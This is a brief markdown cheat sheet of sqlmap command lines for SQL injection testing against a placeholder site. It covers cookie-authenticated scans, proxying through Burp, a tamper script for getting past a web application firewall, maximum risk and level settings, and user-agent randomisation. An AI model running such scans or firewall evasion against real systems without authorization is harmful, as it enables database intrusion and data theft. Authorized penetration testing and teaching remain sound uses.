# SQLMap Advanced Commands

## With cookies (logged-in session)
sqlmap -u "http://testsite.com/page?id=1" --cookie="PHPSESSID=abc123"

## With proxy (Burp Suite)
sqlmap -u "http://testsite.com/page?id=1" --proxy="http://127.0.0.1:8080"

## Bypass WAF with tamper
sqlmap -u "http://testsite.com/page?id=1" --tamper=space2comment

## Set risk and level
sqlmap -u "http://testsite.com/page?id=1" --level=5 --risk=3

## Random user-agent
sqlmap -u "http://testsite.com/page?id=1" --random-agent

## Save output to file
sqlmap -u "http://testsite.com/page?id=1" --output-dir=./results/
